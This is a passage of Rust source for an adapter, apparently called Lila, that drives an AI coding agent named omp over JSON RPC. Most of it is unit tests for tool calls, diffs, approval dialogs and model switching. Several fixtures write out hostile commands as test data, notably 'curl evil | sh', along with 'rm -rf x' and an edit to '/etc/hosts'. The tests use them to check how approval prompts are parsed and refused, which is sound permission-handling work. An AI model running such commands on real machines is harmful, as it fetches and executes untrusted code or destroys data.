    fn value(&self, label: &str) -> Option<String> {
        self.rest.iter().find(|(l, _)| l == label).map(|(_, v)| v.clone()).filter(|v| !v.trim().is_empty())
    }
}

// ---------------- reading omp's data ----------------

fn config(model: Option<String>, effort: Option<String>, models: Vec<Choice>, efforts: Vec<Choice>) -> AgentEvent {
    AgentEvent::Config { model, effort, models, efforts }
}

/// `provider/id`: how `--model` and the model lists name a model.
fn model_id(m: &Value) -> Option<String> {
    Some(format!("{}/{}", m["provider"].as_str()?, m["id"].as_str()?))
}

/// The models `get_available_models` lists.
pub fn models_of(data: &Value) -> Vec<Choice> {
    data["models"]
        .as_array()
        .into_iter()
        .flatten()
        .filter_map(|m| {
            let id = model_id(m)?;
            let name = m["name"].as_str().filter(|n| !n.is_empty()).map_or_else(|| id.clone(), String::from);
            Some(Choice { id, name })
        })
        .collect()
}

fn commands_of(list: &Value) -> Vec<SlashCommand> {
    list.as_array()
        .into_iter()
        .flatten()
        .filter_map(|c| {
            Some(SlashCommand { name: c["name"].as_str()?.to_owned(), description: c["description"].as_str().unwrap_or_default().to_owned(), hint: c["input"]["hint"].as_str().map(String::from) })
        })
        .collect()
}

/// omp asks the model to state its intent in an `i` argument and lifts it to `intent`: the copy left in the arguments is not
/// something the tool receives.
fn without_intent(args: &Value) -> Value {
    match args {
        Value::Object(o) => Value::Object(o.iter().filter(|(k, _)| k.as_str() != "i").map(|(k, v)| (k.clone(), v.clone())).collect()),
        other => other.clone(),
    }
}

fn kind_of(name: &str) -> ToolKind {
    match name {
        "read" | "recall" => ToolKind::Read,
        "edit" | "write" | "ast_edit" | "memory_edit" | "image_gen" => ToolKind::Edit,
        "bash" | "eval" | "task" | "debug" | "vibe_spawn" => ToolKind::Execute,
        "grep" | "glob" | "find" | "ast_grep" | "lsp" => ToolKind::Search,
        "web_search" | "github" => ToolKind::Fetch,
        "think" | "todo" | "wait" | "reflect" | "yield" | "ask" => ToolKind::Think,
        _ => ToolKind::Other,
    }
}

/// The words that say what a call does: its command, file, pattern.
fn primary(args: &Value) -> Option<&str> {
    ["command", "path", "pattern", "query", "code"].iter().find_map(|k| args[*k].as_str()).filter(|v| !v.trim().is_empty())
}

fn one_line(text: &str) -> String {
    text.lines().map(str::trim).filter(|l| !l.is_empty()).collect::<Vec<_>>().join(" ⏎ ")
}

/// One line for a tool call: what it works on, else what the model said it was doing, else its name.
fn tool_title(name: &str, args: &Value, intent: Option<&str>) -> String {
    let arg = |k: &str| args[k].as_str().filter(|v| !v.trim().is_empty());
    let specific = match name {
        "eval" => arg("title").or(arg("code")),
        "task" => args["tasks"][0]["task"].as_str(),
        "edit" => None,
        _ => primary(args),
    };
    specific.map(one_line).or_else(|| intent.filter(|i| !i.trim().is_empty()).map(String::from)).unwrap_or_else(|| name.to_owned())
}

/// A tool's output: the text in its result.
fn output_of(content: &Value) -> Option<String> {
    let text = match content {
        Value::String(s) => s.clone(),
        Value::Array(parts) => parts.iter().filter_map(|c| c["text"].as_str()).collect::<Vec<_>>().join("\n"),
        _ => return None,
    };
    (!text.trim().is_empty()).then(|| clip(text.trim(), MAX_OUTPUT))
}

/// The before/after text of each file an edit changed, as unified-diff lines.
fn diffs_of(details: &Value) -> Vec<FileDiff> {
    let files = match details["perFileResults"].as_array() {
        Some(list) => list.clone(),
        None => vec![details.clone()],
    };
    files
        .iter()
        .filter_map(|f| {
            let path = f["path"].as_str()?;
            let new = f["newText"].as_str()?;
            let old = f["oldText"].as_str().unwrap_or_default();
            let diff = similar::TextDiff::from_lines(old, new);
            let lines: Vec<String> = diff.unified_diff().context_radius(2).to_string().lines().map(String::from).collect();
            Some(FileDiff { path: path.to_owned(), lines })
        })
        .collect()
}

fn block_item(run: &str, turn: Option<String>, message: u64, idx: usize, b: &Block, state: ItemState) -> Item {
    let text = b.text.trim().to_owned();
    let kind = if b.thought { ItemKind::Thought { text } } else { ItemKind::AgentMessage { text } };
    Item { id: format!("{run}-m{message}-{idx}"), turn, at_ms: b.at_ms, state, kind }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn omp() -> Omp {
        Omp::new(Options { cwd: "/r".into(), run: "r1".into() })
    }

    fn line(o: &mut Omp, f: Value, now: i64) -> Step {
        o.on_line(&f.to_string(), now)
    }

    /// The id of the request in `step` with this `type`.
    fn req(step: &Step, ty: &str) -> String {
        step.send.iter().find(|m| m["type"] == ty).and_then(|m| m["id"].as_str()).unwrap_or_else(|| panic!("no {ty} in {:?}", step.send)).to_owned()
    }

    fn respond(o: &mut Omp, id: &str, data: Value) -> Step {
        line(o, json!({"type": "response", "id": id, "success": true, "data": data}), 0)
    }

    /// An omp that answered `ready`, `get_state` and its lists, as omp 18.20 does (shortened).
    fn open() -> Omp {
        let mut o = omp();
        let hello = line(&mut o, json!({"type": "ready", "protocolVersion": 1, "supportedProtocolVersions": [1, 2]}), 0);
        assert_eq!(hello.send.iter().map(|m| m["type"].as_str().unwrap()).collect::<Vec<_>>(), ["negotiate_protocol", "get_state", "get_available_models", "get_available_thinking_levels"]);
        respond(&mut o, &req(&hello, "negotiate_protocol"), json!({"protocolVersion": 2}));
        let state = json!({"model": {"provider": "magpie", "id": "claude/claude-sonnet-5-5", "name": "Sonnet via magpie", "input": ["text", "image"]}, "thinkingLevel": "high", "sessionId": "s1", "isStreaming": false});
        respond(&mut o, &req(&hello, "get_state"), state);
        respond(&mut o, &req(&hello, "get_available_models"), json!({"models": [{"provider": "magpie", "id": "claude/claude-sonnet-5-5", "name": "Sonnet via magpie"}, {"provider": "openai", "id": "gpt-6", "name": "GPT-6"}]}));
        respond(&mut o, &req(&hello, "get_available_thinking_levels"), json!({"levels": ["off", "low", "high"]}));
        o
    }

    fn prompt(o: &mut Omp, text: &str) -> Step {
        o.command(Command::Prompt { text: text.into(), attachments: vec![] }, 1)
    }

    fn items(step: &Step) -> Vec<&Item> {
        step.events.iter().filter_map(|e| if let AgentEvent::Item { item } = e { Some(item) } else { None }).collect()
    }

    fn tool_call(id: &str, name: &str, args: Value) -> Value {
        json!({"type": "message_update", "assistantMessageEvent": {"type": "toolcall_end", "contentIndex": 0, "toolCall": {"type": "toolCall", "id": id, "name": name, "arguments": args, "intent": "doing it"}}})
    }

    fn approval(id: &str, title: &str) -> Value {
        json!({"type": "extension_ui_request", "id": id, "method": "select", "title": title, "options": ["Approve", format!("Approve {} for this session", title.lines().next().unwrap_or_default().trim_start_matches(APPROVAL)), "Deny"]})
    }

    fn permission(step: &Step) -> &PermissionRequest {
        step.events.iter().find_map(|e| if let AgentEvent::Permission { request } = e { Some(request) } else { None }).unwrap_or_else(|| panic!("no permission in {:?}", step.events))
    }

    #[test]
    fn the_handshake_gives_the_session_the_model_and_what_it_offers_and_then_the_words_go() {
        let mut o = omp();
        assert!(prompt(&mut o, "hi").send.is_empty(), "words wait for the session");
        assert_eq!(o.status(), HostStatus::Working);
        let hello = line(&mut o, json!({"type": "ready", "supportedProtocolVersions": [1, 2]}), 0);
        let state = respond(&mut o, &req(&hello, "get_state"), json!({"model": {"provider": "openai", "id": "gpt-6", "input": ["text"]}, "thinkingLevel": "low", "sessionId": "s9"}));
        assert_eq!(state.events[0], AgentEvent::Session { id: "s9".into() });
        assert_eq!(state.events[1], AgentEvent::Config { model: Some("openai/gpt-6".into()), effort: Some("low".into()), models: vec![], efforts: vec![] });
        let sent = &state.send[0];
        assert_eq!((sent["type"].as_str(), sent["message"].as_str()), (Some("prompt"), Some("hi")));
        assert!(sent.get("streamingBehavior").is_none());
        assert!(matches!(&state.events[2], AgentEvent::TurnStarted { turn } if turn == "r1-t1"));
        let models = respond(&mut o, &req(&hello, "get_available_models"), json!({"models": [{"provider": "openai", "id": "gpt-6", "name": "GPT-6"}, {"id": "broken"}]}));
        assert_eq!(models.events, [AgentEvent::Config { model: None, effort: None, models: vec![Choice { id: "openai/gpt-6".into(), name: "GPT-6".into() }], efforts: vec![] }]);
        let levels = respond(&mut o, &req(&hello, "get_available_thinking_levels"), json!({"levels": ["off", "low"]}));
        assert!(matches!(&levels.events[0], AgentEvent::Config { efforts, .. } if efforts.iter().map(|c| c.id.as_str()).collect::<Vec<_>>() == ["off", "low"]));
        // An omp that offers no protocol 2 is spoken to in 1.
        let mut old = omp();
        assert!(!line(&mut old, json!({"type": "ready", "protocolVersion": 1}), 0).send.iter().any(|m| m["type"] == "negotiate_protocol"));
    }

    #[test]
    fn a_turn_is_the_words_then_the_streamed_reply_then_prompt_result() {
        let mut o = open();
        assert_eq!(o.status(), HostStatus::Idle);
        let sent = o.command(Command::Prompt { text: "<lila note about=\"restore\">\nback\n</lila>\n\nfix it @a.rs".into(), attachments: vec![Attachment { name: "a.rs".into(), ..Attachment::file("/r/a.rs") }, Attachment::file("/r/b.md")] }, 5);
        assert_eq!(sent.send[0]["message"], "<lila note about=\"restore\">\nback\n</lila>\n\nfix it @a.rs\n\nFiles:\n- /r/a.rs\n- /r/b.md");
        let AgentEvent::Item { item: said } = &sent.events[1] else { panic!("{:?}", sent.events) };
        assert!(matches!(&said.kind, ItemKind::UserMessage { text, origin: Origin::Person, attachments } if text == "fix it @a.rs" && attachments.len() == 1 && attachments[0].path == "/r/b.md"), "{said:?}");
        assert_eq!((said.id.as_str(), said.turn.as_deref(), said.at_ms), ("r1-t1-said", Some("r1-t1"), 5));
        assert_eq!(o.status(), HostStatus::Working);
        assert!(prompt(&mut o, "and docs").send.is_empty(), "one turn at a time");
        // The reply streams in pieces: shown at once, then as it grows, then whole.
        line(&mut o, json!({"type": "agent_start"}), 10);
        line(&mut o, json!({"type": "message_start", "message": {"role": "assistant", "content": []}}), 10);
        let d = |text: &str| json!({"type": "message_update", "assistantMessageEvent": {"type": "text_delta", "contentIndex": 0, "delta": text}});
        let first = line(&mut o, d("Read"), 100);
        assert!(matches!(items(&first)[0], Item { state: ItemState::Running, id, kind: ItemKind::AgentMessage { text }, .. } if id == "r1-m1-0" && text == "Read"));
        assert!(line(&mut o, d("ing it."), 200).events.is_empty(), "not again so soon");
        let shown = o.tick(100 + SHOW_EVERY_MS);
        assert!(matches!(items(&shown)[0], Item { kind: ItemKind::AgentMessage { text }, .. } if text == "Reading it."));
        assert!(o.tick(100 + 2 * SHOW_EVERY_MS).events.is_empty(), "nothing new");
        let end = line(&mut o, json!({"type": "message_end", "message": {"role": "assistant", "content": [{"type": "text", "text": "Reading it."}], "stopReason": "stop", "usage": {"input": 10, "output": 2, "cacheRead": 5}}}), 300);
        assert!(matches!(items(&end)[0], Item { state: ItemState::Done, at_ms: 100, kind: ItemKind::AgentMessage { text }, .. } if text == "Reading it."));
        line(&mut o, json!({"type": "agent_end"}), 400);
        assert_eq!(o.status(), HostStatus::Working, "the turn ends with prompt_result");
        let done = line(&mut o, json!({"type": "prompt_result", "id": req(&sent, "prompt"), "agentInvoked": true, "status": "completed"}), 500);
        assert!(done.events.contains(&AgentEvent::Usage { input: 10, output: 2, cached: 5 }));
        assert!(done.events.contains(&AgentEvent::TurnEnded { turn: "r1-t1".into(), failed: None }));
        assert_eq!(done.send[0]["message"], "and docs", "then what waited");
        assert!(matches!(&done.events.last(), Some(AgentEvent::Item { .. })), "the next turn's words");
    }

    #[test]
    fn thoughts_come_before_the_reply_and_tool_calls_settle_what_was_said() {
        let mut o = open();
        prompt(&mut o, "go");
        let d = |idx: u64, ty: &str, text: &str| json!({"type": "message_update", "assistantMessageEvent": {"type": ty, "contentIndex": idx, "delta": text}});
        let think = line(&mut o, d(0, "thinking_delta", "hm"), 10);
        assert!(matches!(items(&think)[0].kind, ItemKind::Thought { .. }));
        let say = line(&mut o, d(1, "text_delta", "Let me look."), 20);
        assert!(matches!(items(&say)[0], Item { state: ItemState::Done, kind: ItemKind::Thought { text }, .. } if text == "hm"), "a later block makes the earlier one final");
        let call = line(&mut o, tool_call("c1", "read", json!({"path": "a.rs", "i": "Looking"})), 30);
        let all = items(&call);
        assert!(matches!(all[0], Item { state: ItemState::Done, kind: ItemKind::AgentMessage { .. }, .. }));
        assert!(matches!(all[1], Item { id, state: ItemState::Running, kind: ItemKind::ToolCall { tool: ToolKind::Read, name, title, .. }, .. } if id == "r1-c1" && name == "read" && title == "a.rs"));
        let started = line(&mut o, json!({"type": "tool_execution_start", "toolCallId": "c1", "toolName": "read", "args": {"path": "a.rs"}}), 40);
        assert_eq!(items(&started).len(), 1);
        let ended = line(&mut o, json!({"type": "tool_execution_end", "toolCallId": "c1", "toolName": "read", "result": {"content": [{"type": "text", "text": "fn main() {}"}]}}), 50);
        assert!(matches!(items(&ended)[0], Item { state: ItemState::Done, at_ms: 30, kind: ItemKind::ToolCall { output: Some(o), .. }, .. } if o == "fn main() {}"));
        let failed = line(&mut o, tool_call("c2", "bash", json!({"command": "false\nexit 1"})), 60);
        let bad = line(&mut o, json!({"type": "tool_execution_end", "toolCallId": "c2", "toolName": "bash", "result": {"content": [{"type": "text", "text": "exit 1"}]}, "isError": true}), 70);
        assert!(matches!(items(&failed)[0], Item { kind: ItemKind::ToolCall { title, .. }, .. } if title == "false ⏎ exit 1"));
        assert_eq!(items(&bad)[0].state, ItemState::Failed);
    }

    #[test]
    fn an_edit_shows_its_files_as_diffs() {
        let mut o = open();
        prompt(&mut o, "go");
        line(&mut o, tool_call("e1", "edit", json!({"input": "…"})), 10);
        let done = line(&mut o, json!({"type": "tool_execution_end", "toolCallId": "e1", "toolName": "edit", "result": {"content": [{"type": "text", "text": "ok"}], "details": {"path": "src/a.py", "oldText": "a\nb\n", "newText": "a\nc\n"}}}), 20);
        let ItemKind::ToolCall { title, diffs, .. } = &items(&done)[0].kind else { panic!() };
        assert_eq!((title.as_str(), diffs[0].path.as_str()), ("src/a.py", "src/a.py"));
        assert!(diffs[0].lines.iter().any(|l| l == "-b") && diffs[0].lines.iter().any(|l| l == "+c"), "{:?}", diffs[0].lines);
        let many = diffs_of(&json!({"perFileResults": [{"path": "a", "oldText": "", "newText": "x\n"}, {"path": "b", "newText": "y\n"}, {"path": "c"}]}));
        assert_eq!(many.iter().map(|d| d.path.as_str()).collect::<Vec<_>>(), ["a", "b"]);
    }

    #[test]
    fn an_approval_is_matched_to_its_tool_call_and_answered_with_omps_own_labels() {
        let mut o = open();
        prompt(&mut o, "go");
        line(&mut o, tool_call("c1", "bash", json!({"command": "git push origin main", "cwd": "sub", "i": "Pushing"})), 10);
        line(&mut o, json!({"type": "tool_execution_start", "toolCallId": "c1", "toolName": "bash", "args": {"command": "git push origin main", "cwd": "sub"}}), 11);
        let ask = line(&mut o, approval("ui1", "Allow tool: bash\nCommand: git push origin main"), 12);
        let p = permission(&ask);
        assert_eq!((p.id.as_str(), p.tool, p.name.as_str(), p.command.as_deref(), p.cwd.as_deref(), p.title.as_str()), ("ui1", ToolKind::Execute, "bash", Some("git push origin main"), Some("/r/sub"), "git push origin main"));
        // Lila's rules stand in for "for this session": only the plain yes and no.
        assert_eq!(p.options.iter().map(|x| (x.id.as_str(), x.kind)).collect::<Vec<_>>(), [("Approve", PermKind::Allow), ("Deny", PermKind::Reject)]);
        assert!(matches!(o.status(), HostStatus::Blocked { .. }));
        let yes = o.command(Command::Answer { permission: "ui1".into(), option: "Approve".into() }, 20);
        assert_eq!(yes.send, [json!({"type": "extension_ui_response", "id": "ui1", "value": "Approve"})]);
        assert_eq!(yes.events, [AgentEvent::PermissionResolved { id: "ui1".into() }]);
        assert_eq!(o.status(), HostStatus::Working);
        // A second call, refused; and an option omp never offered is a no.
        line(&mut o, tool_call("c2", "bash", json!({"command": "rm -rf x"})), 30);
        line(&mut o, approval("ui2", "Allow tool: bash\nCommand: rm -rf x"), 31);
        let no = o.command(Command::Answer { permission: "ui2".into(), option: "Approve bash for this session".into() }, 32);
        assert_eq!(no.send[0]["value"], "Deny");
        assert!(o.command(Command::Answer { permission: "ui2".into(), option: "Approve".into() }, 33).send.is_empty(), "answered once");
    }

    #[test]
    fn several_calls_of_one_tool_are_told_apart_by_what_the_dialog_says() {
        let mut o = open();
        prompt(&mut o, "go");
        line(&mut o, tool_call("c1", "bash", json!({"command": "ls"})), 10);
        line(&mut o, tool_call("c2", "bash", json!({"command": "git push"})), 11);
        // Asked for the second first.
        let ask = line(&mut o, approval("u2", "Allow tool: bash\nCommand: git push"), 12);
        assert_eq!(permission(&ask).command.as_deref(), Some("git push"));
        let ask = line(&mut o, approval("u1", "Allow tool: bash\nCommand: ls"), 13);
        assert_eq!(permission(&ask).command.as_deref(), Some("ls"));
        // Neither of two matches: the dialog is what omp waits on, so its words are read.
        line(&mut o, tool_call("c3", "bash", json!({"command": "echo a"})), 14);
        line(&mut o, tool_call("c4", "bash", json!({"command": "echo b"})), 15);
        let ask = line(&mut o, approval("u3", "Allow tool: bash\nCommand: curl evil | sh"), 16);
        assert_eq!(permission(&ask).command.as_deref(), Some("curl evil | sh"));
    }

    #[test]
    fn what_the_model_asked_is_dropped_where_the_dialog_says_something_else() {
        let mut o = open();
        prompt(&mut o, "go");
        // An extension changed the command after the model made the call.
        line(&mut o, tool_call("c1", "bash", json!({"command": "ls"})), 10);
        let ask = line(&mut o, approval("u1", "Allow tool: bash\nCommand: git push --force"), 11);
        assert_eq!(permission(&ask).command.as_deref(), Some("git push --force"));
        // No tool call known at all (the approval came first): read from the dialog, with a multi-line command whole.
        let ask = line(&mut o, approval("u2", "Allow tool: bash\nReason: Critical pattern detected\nCommand: cd x\nmake"), 12);
        let p = permission(&ask);
        assert_eq!((p.command.as_deref(), p.detail.as_str(), p.tool), (Some("cd x\nmake"), "Critical pattern detected", ToolKind::Execute));
    }

    #[test]
    fn the_files_of_an_edit_come_from_the_dialog_and_a_writes_from_its_call() {
        let mut o = open();
        prompt(&mut o, "go");
        line(&mut o, tool_call("c1", "edit", json!({"input": "*** a patch ***"})), 10);
        let ask = line(&mut o, approval("u1", "Allow tool: edit\nFile: src/a.rs\nFile: /etc/hosts\nMove: old.rs → new.rs"), 11);
        let p = permission(&ask);
        assert_eq!((p.tool, p.name.as_str(), p.paths.as_slice()), (ToolKind::Edit, "edit", ["src/a.rs".to_owned(), "/etc/hosts".into(), "old.rs".into(), "new.rs".into()].as_slice()));
        assert_eq!(p.title, "src/a.rs, /etc/hosts, old.rs, new.rs");
        line(&mut o, tool_call("c2", "write", json!({"path": "notes/x.md", "content": "hi"})), 12);
        let ask = line(&mut o, approval("u2", "Allow tool: write\nPath: notes/x.md\nContent:\nhi"), 13);
        assert_eq!((permission(&ask).tool, permission(&ask).paths.as_slice()), (ToolKind::Edit, ["notes/x.md".to_owned()].as_slice()));
        // An MCP tool keeps omp's name, and a tool Lila has no kind for is "other".
        line(&mut o, tool_call("c3", "mcp__github__create_issue", json!({"title": "x"})), 14);
        let ask = line(&mut o, approval("u3", "Allow tool: mcp__github__create_issue\nOrigin: MCP server tool\nArguments:\n{}"), 15);
        let p = permission(&ask);
        assert_eq!((p.tool, p.name.as_str(), p.title.as_str()), (ToolKind::Other, "mcp__github__create_issue", "doing it"));
    }

    #[test]
    fn interrupting_aborts_and_takes_the_open_dialogs_back() {
        let mut o = open();
        assert!(o.command(Command::Interrupt, 1).send.is_empty(), "nothing runs");
        prompt(&mut o, "go");
        line(&mut o, tool_call("c1", "bash", json!({"command": "sleep 9"})), 10);
        line(&mut o, approval("u1", "Allow tool: bash\nCommand: sleep 9"), 11);
        line(&mut o, json!({"type": "extension_ui_request", "id": "q1", "method": "input", "title": "Name?"}), 12);
        let stop = o.command(Command::Interrupt, 20);
        assert_eq!(stop.send[0]["type"], "abort");
        assert!(stop.send.contains(&json!({"type": "extension_ui_response", "id": "u1", "value": "Deny"})));
        assert!(stop.send.contains(&json!({"type": "extension_ui_response", "id": "q1", "cancelled": true})));
        assert!(stop.events.contains(&AgentEvent::PermissionResolved { id: "u1".into() }) && stop.events.contains(&AgentEvent::QuestionResolved { id: "q1".into() }));
        // The turn ends when omp says so; a tool that never finished is failed, not running for ever.
        let id = o.turn.as_ref().unwrap().req.clone();
        let end = line(&mut o, json!({"type": "prompt_result", "id": id, "agentInvoked": true, "status": "aborted"}), 30);
        assert!(items(&end).iter().any(|i| i.state == ItemState::Failed && matches!(i.kind, ItemKind::ToolCall { .. })));
        assert!(end.events.contains(&AgentEvent::TurnEnded { turn: "r1-t1".into(), failed: None }));
        assert_eq!(o.status(), HostStatus::Done);
    }

    #[test]
    fn omp_taking_a_dialog_back_closes_its_card() {
        let mut o = open();
        prompt(&mut o, "go");
        line(&mut o, tool_call("c1", "bash", json!({"command": "ls"})), 10);
        line(&mut o, approval("u1", "Allow tool: bash\nCommand: ls"), 11);
        line(&mut o, json!({"type": "extension_ui_request", "id": "q1", "method": "confirm", "title": "Sure?", "message": "really"}), 12);
        let gone = line(&mut o, json!({"type": "extension_ui_request", "id": "c9", "method": "cancel", "targetId": "q1"}), 13);
        assert_eq!(gone.events, [AgentEvent::QuestionResolved { id: "q1".into() }]);
        assert!(matches!(o.status(), HostStatus::Blocked { .. }), "the approval still waits");
        let gone = line(&mut o, json!({"type": "extension_ui_request", "id": "c10", "method": "cancel", "targetId": "u1"}), 14);
        assert_eq!(gone.events, [AgentEvent::PermissionResolved { id: "u1".into() }]);
        assert_eq!(o.status(), HostStatus::Working);
    }

    #[test]
    fn dialogs_that_are_not_approvals_are_questions_and_every_kind_is_answered() {
        let mut o = open();
        prompt(&mut o, "go");
        let ask = |o: &mut Omp, f: Value| match line(o, f, 10).events.remove(0) {
            AgentEvent::Question { question } => question,
            other => panic!("{other:?}"),
        };
        let q = ask(&mut o, json!({"type": "extension_ui_request", "id": "a", "method": "select", "title": "Which database?", "options": ["Postgres", "SQLite"]}));
        assert_eq!((q.kind, q.options.as_slice(), q.title.as_str()), (QuestionKind::Choice, ["Postgres".to_owned(), "SQLite".into()].as_slice(), "Which database?"));
        let q = ask(&mut o, json!({"type": "extension_ui_request", "id": "b", "method": "confirm", "title": "Continue?", "message": "It deletes things."}));
        assert_eq!((q.kind, q.detail.as_str()), (QuestionKind::Confirm, "It deletes things."));
        let q = ask(&mut o, json!({"type": "extension_ui_request", "id": "c", "method": "input", "title": "Token?", "placeholder": "abc", "secret": true}));
        assert_eq!((q.kind, q.prefill.as_str(), q.secret), (QuestionKind::Text, "abc", true));
        let q = ask(&mut o, json!({"type": "extension_ui_request", "id": "d", "method": "editor", "title": "Edit", "prefill": "draft"}));
        assert_eq!((q.kind, q.prefill.as_str()), (QuestionKind::Text, "draft"));
        // A select about a tool that is not an approval is still only a question.
        let q = ask(&mut o, json!({"type": "extension_ui_request", "id": "e", "method": "select", "title": "Allow tool: x?", "options": ["Yes", "No"]}));
        assert_eq!(q.id, "e");
        let reply = |o: &mut Omp, id: &str, r: Reply| o.command(Command::Reply { question: id.into(), reply: r }, 20);
        assert_eq!(reply(&mut o, "a", Reply::Choice { value: "SQLite".into() }).send, [json!({"type": "extension_ui_response", "id": "a", "value": "SQLite"})]);
        assert_eq!(reply(&mut o, "b", Reply::Confirm { yes: false }).send, [json!({"type": "extension_ui_response", "id": "b", "confirmed": false})]);
        assert_eq!(reply(&mut o, "c", Reply::Text { value: "t0k".into() }).send, [json!({"type": "extension_ui_response", "id": "c", "value": "t0k"})]);
        let cancelled = reply(&mut o, "d", Reply::Cancel);
        assert_eq!(cancelled.send, [json!({"type": "extension_ui_response", "id": "d", "cancelled": true})]);
        assert_eq!(cancelled.events, [AgentEvent::QuestionResolved { id: "d".into() }]);
        assert!(reply(&mut o, "d", Reply::Cancel).send.is_empty(), "answered once");
        // Presentation is not a question.
        for method in ["notify", "setStatus", "setWidget", "setTitle", "set_editor_text"] {
            assert!(line(&mut o, json!({"type": "extension_ui_request", "id": "n", "method": method, "message": "hi"}), 30).events.is_empty(), "{method}");
        }
        assert!(matches!(o.status(), HostStatus::Blocked { .. }));
        reply(&mut o, "e", Reply::Cancel);
        assert_eq!(o.status(), HostStatus::Working);
    }

    #[test]
    fn a_failed_model_request_is_an_error_in_the_conversation_and_the_turn_failed() {
        let mut o = open();
        let sent = prompt(&mut o, "go");
        line(&mut o, json!({"type": "message_end", "message": {"role": "assistant", "content": [], "stopReason": "error", "errorMessage": "502 bad gateway"}}), 10);
        line(&mut o, json!({"type": "agent_end"}), 11);
        let end = line(&mut o, json!({"type": "prompt_result", "id": req(&sent, "prompt"), "agentInvoked": true, "status": "error", "error": {"message": "502 bad gateway", "retryable": true}}), 12);
        assert!(matches!(items(&end)[0], Item { state: ItemState::Failed, kind: ItemKind::Error { text }, .. } if text == "502 bad gateway"));
        assert!(end.events.contains(&AgentEvent::TurnEnded { turn: "r1-t1".into(), failed: Some("502 bad gateway".into()) }));
        assert_eq!(o.status(), HostStatus::Done, "the thread takes a message again");
        // A prompt omp refused outright ends its turn the same way, once.
        let sent = prompt(&mut o, "again");
        let refused = line(&mut o, json!({"type": "response", "id": req(&sent, "prompt"), "success": false, "error": "no model"}), 20);
        assert!(refused.events.contains(&AgentEvent::TurnEnded { turn: "r1-t2".into(), failed: Some("no model".into()) }));
        assert!(line(&mut o, json!({"type": "prompt_result", "id": req(&sent, "prompt"), "status": "error", "error": {"message": "no model"}}), 21).events.is_empty());
        // A slash command that never reached the agent: the turn is over at once and nothing is "done" to look at.
        let sent = prompt(&mut o, "/model");
        let local = line(&mut o, json!({"type": "response", "id": req(&sent, "prompt"), "success": true, "data": {"agentInvoked": false}}), 30);
        assert!(local.events.contains(&AgentEvent::TurnEnded { turn: "r1-t3".into(), failed: None }));
        assert_eq!(o.status(), HostStatus::Idle);
    }

    #[test]
    fn omp_stopping_ends_everything_and_says_why() {
        let mut o = open();
        prompt(&mut o, "go");
        line(&mut o, tool_call("c1", "bash", json!({"command": "ls"})), 10);
        line(&mut o, approval("u1", "Allow tool: bash\nCommand: ls"), 11);
        let gone = o.exited("omp exited (code 7): boom", 20);
        assert!(gone.events.contains(&AgentEvent::PermissionResolved { id: "u1".into() }));
        assert!(gone.events.contains(&AgentEvent::TurnEnded { turn: "r1-t1".into(), failed: Some("omp exited (code 7): boom".into()) }));
        assert!(items(&gone).iter().any(|i| matches!(&i.kind, ItemKind::Error { text } if text.contains("boom"))));
        assert_eq!(o.status(), HostStatus::Error { why: "omp exited (code 7): boom".into() });
        assert!(prompt(&mut o, "more").send.is_empty());
    }

    #[test]
    fn the_model_and_effort_are_switched_by_omps_own_commands_and_read_back() {
        let mut o = open();
        let set = o.command(Command::SetModel { model: "openai/gpt-6".into() }, 1);
        assert_eq!((set.send[0]["type"].as_str(), set.send[0]["provider"].as_str(), set.send[0]["modelId"].as_str()), (Some("set_model"), Some("openai"), Some("gpt-6")));
        // A model id may hold slashes: only the first one is the provider's.
        assert_eq!(o.command(Command::SetModel { model: "magpie/claude/claude-sonnet-5-5".into() }, 1).send[0]["modelId"], "claude/claude-sonnet-5-5");
        let after = respond(&mut o, &req(&set, "set_model"), json!({"provider": "openai", "id": "gpt-6"}));
        assert_eq!(after.send.iter().map(|m| m["type"].as_str().unwrap()).collect::<Vec<_>>(), ["get_state", "get_available_thinking_levels"]);
        let state = respond(&mut o, &req(&after, "get_state"), json!({"model": {"provider": "openai", "id": "gpt-6"}, "thinkingLevel": "off"}));
        assert!(state.events.contains(&AgentEvent::Config { model: Some("openai/gpt-6".into()), effort: Some("off".into()), models: vec![], efforts: vec![] }));
        let level = o.command(Command::SetEffort { effort: "low".into() }, 2);
        assert_eq!(level.send[0]["level"], "low");
        let bad = line(&mut o, json!({"type": "response", "id": req(&level, "set_thinking_level"), "success": false, "error": "not supported"}), 3);
        assert_eq!(bad.events, [AgentEvent::Notice { text: "not supported".into() }]);
        assert!(matches!(&o.command(Command::SetModel { model: "nope".into() }, 4).events[0], AgentEvent::Notice { .. }));
        // omp changing it itself (a /model command) is heard.
        let changed = line(&mut o, json!({"type": "model_changed"}), 5);
        assert_eq!(changed.send.len(), 2);
        assert_eq!(line(&mut o, json!({"type": "thinking_level_changed", "thinkingLevel": "high"}), 6).events, [AgentEvent::Config { model: None, effort: Some("high".into()), models: vec![], efforts: vec![] }]);
    }

    #[test]
    fn frames_over_a_mebibyte_arrive_in_pieces_and_are_put_together() {
        let mut o = open();
        let body = json!({"type": "extension_ui_request", "id": "q", "method": "select", "title": "Pick one", "options": ["a", "b"]}).to_string();
        let half = body.len() / 2;
        let piece = |index: u64, bytes: &[u8]| json!({"type": "rpc_chunk", "chunkId": "c1", "index": index, "count": 2, "byteLength": body.len(), "data": STANDARD.encode(bytes)});
        assert!(line(&mut o, piece(0, &body.as_bytes()[..half]), 0).events.is_empty());
        let whole = line(&mut o, piece(1, &body.as_bytes()[half..]), 0);
        assert!(matches!(&whole.events[0], AgentEvent::Question { question } if question.title == "Pick one"));
        // A piece out of order drops the frame, and the next one is not spoilt by it.
        assert!(line(&mut o, piece(1, b"x"), 0).events.is_empty());
        assert!(line(&mut o, piece(0, &body.as_bytes()[..half]), 0).events.is_empty());
        assert!(matches!(&line(&mut o, piece(1, &body.as_bytes()[half..]), 0).events[0], AgentEvent::Question { .. }));
        // Lines that are not frames are let go.
        assert_eq!(o.on_line("not json at all", 0), Step::default());
        assert_eq!(o.on_line("{\"no\": \"type\"}", 0), Step::default());
    }

    #[test]
    fn images_go_inline_when_the_model_takes_them_and_other_files_as_paths() {
        let dir = std::env::temp_dir().join(format!("lila-omp-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let png = dir.join("a.png");
        std::fs::write(&png, b"\x89PNG").unwrap();
        let mut o = open();
        let sent = o.command(Command::Prompt { text: "look".into(), attachments: vec![Attachment::file(png.to_str().unwrap())] }, 1);
        assert_eq!(sent.send[0]["images"], json!([{"type": "image", "data": "iVBORw==", "mimeType": "image/png"}]));
        assert_eq!(sent.send[0]["message"], "look");
        // A model without image input gets the path.
        let mut text_only = omp();
        let hello = line(&mut text_only, json!({"type": "ready"}), 0);
